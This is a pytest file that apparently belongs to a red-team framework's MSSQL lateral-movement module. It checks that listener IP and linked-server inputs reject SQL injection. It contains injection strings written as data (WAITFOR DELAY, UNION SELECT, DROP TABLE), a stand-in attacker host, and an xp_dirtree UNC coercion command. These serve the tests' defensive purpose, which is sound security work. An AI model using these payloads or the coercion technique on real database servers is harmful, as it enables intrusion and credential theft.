"""
Tests for AUD-002: Strict input validation on listener_ip for MSSQL xp_dirtree
and linked_server parameter validation.
"""
from unittest.mock import MagicMock, patch
import pytest

from ares.core.campaign import Campaign, NoiseProfile, ScopeEntry
from ares.core.config import AresSettings
from ares.core.errors import ModuleValidationError
from ares.core.noise import NoiseController
from ares.modules.lateral.mssql import MSSQLModule
from ares.sdk import ExecutionContext


def _make_module() -> MSSQLModule:
    settings = AresSettings(
        ares_secret_key="test-secret-key-32chars-minimum!!",
        ares_encryption_key="test-encryption-key-32chars-min!!",
    )
    campaign = Campaign(
        name="MSSQL-AUD002-Test",
        operator="test_operator",
        scope=[ScopeEntry(cidr="10.0.0.0/8")],
        noise_profile=NoiseProfile.NORMAL,
    )
    noise = NoiseController(campaign)
    return MSSQLModule(settings=settings, campaign=campaign, noise=noise)


def test_validate_listener_ip_valid_ipv4_and_ipv6():
    """Valid IPv4 and IPv6 addresses must be accepted."""
    mod = _make_module()
    assert mod._validate_listener_ip("10.0.0.1") == "10.0.0.1"
    assert mod._validate_listener_ip("192.168.1.100") == "192.168.1.100"
    assert mod._validate_listener_ip("::1") == "::1"
    assert mod._validate_listener_ip("fe80::1") == "fe80::1"
    assert mod._validate_listener_ip("  10.0.0.1  ") == "10.0.0.1"


def test_validate_listener_ip_rejects_sql_injection():
    """SQL injection payloads in listener_ip must raise ModuleValidationError."""
    mod = _make_module()
    with pytest.raises(ModuleValidationError) as exc:
        mod._validate_listener_ip("10.0.0.1'; WAITFOR DELAY '0:0:5'--")
    assert "listener_ip must be a valid IP address" in str(exc.value)

    with pytest.raises(ModuleValidationError):
        mod._validate_listener_ip("10.0.0.1\\share")

    with pytest.raises(ModuleValidationError):
        mod._validate_listener_ip("10.0.0.1' UNION SELECT @@version--")


def test_validate_listener_ip_rejects_hostnames():
    """Hostnames must be rejected to prevent DNS rebinding and arbitrary resolution."""
    mod = _make_module()
    with pytest.raises(ModuleValidationError) as exc:
        mod._validate_listener_ip("hostname.local")
    assert "listener_ip must be a valid IP address" in str(exc.value)

    with pytest.raises(ModuleValidationError):
        mod._validate_listener_ip("attacker.evil.com")


def test_validate_linked_server_valid_and_invalid():
    """Linked server name must be a clean identifier."""
    mod = _make_module()
    assert mod._validate_linked_server("SQL-PROD-01") == "SQL-PROD-01"
    assert mod._validate_linked_server("SRV_BACKUP.CORP") == "SRV_BACKUP.CORP"
    assert mod._validate_linked_server("10.0.0.50") == "10.0.0.50"

    with pytest.raises(ModuleValidationError):
        mod._validate_linked_server("srv'; DROP TABLE users--")

    with pytest.raises(ModuleValidationError):
        mod._validate_linked_server("srv[0]")

    with pytest.raises(ModuleValidationError):
        mod._validate_linked_server("")


@pytest.mark.asyncio
async def test_module_validate_rejects_bad_listener_ip():
    """ExecutionContext validation catches invalid listener_ip before execution."""
    mod = _make_module()
    ctx = ExecutionContext(
        campaign_id="test",
        target="10.0.0.25",
        params={
            "target": "10.0.0.25",
            "username": "sa",
            "password": "pwd",
            "technique": "unc_coerce",
            "listener_ip": "10.0.0.1'; WAITFOR DELAY '0:0:5'--",
        },
    )
    with pytest.raises(ModuleValidationError) as exc:
        await mod.validate(ctx)
    assert "listener_ip must be a valid IP address" in str(exc.value)


@pytest.mark.asyncio
async def test_unc_coerce_sync_executes_with_valid_ip():
    """With valid IP, _unc_coerce_sync executes xp_dirtree with clean UNC path."""
    mod = _make_module()

    mock_cursor = MagicMock()
    mock_conn = MagicMock()
    mock_conn.cursor.return_value = mock_cursor
    mock_pymssql = MagicMock()
    mock_pymssql.connect.return_value = mock_conn

    with patch.dict("sys.modules", {"pymssql": mock_pymssql}):
        success = mod._unc_coerce_sync(
            target="10.0.0.20",
            username="sa",
            password="pwd",
            port=1433,
            listener_ip="10.0.0.1",
        )
        assert success is True
        mock_cursor.execute.assert_called_once_with("EXEC xp_dirtree '\\\\10.0.0.1\\share'")


@pytest.mark.asyncio
async def test_unc_coerce_sync_aborts_on_injection_attempt():
    """With injected listener_ip, _unc_coerce_sync raises ModuleValidationError before connecting."""
    mod = _make_module()

    mock_pymssql = MagicMock()
    with patch.dict("sys.modules", {"pymssql": mock_pymssql}):
        with pytest.raises(ModuleValidationError):
            mod._unc_coerce_sync(
                target="10.0.0.20",
                username="sa",
                password="pwd",
                port=1433,
                listener_ip="10.0.0.1'; WAITFOR DELAY '0:0:5'--",
            )
        mock_pymssql.connect.assert_not_called()
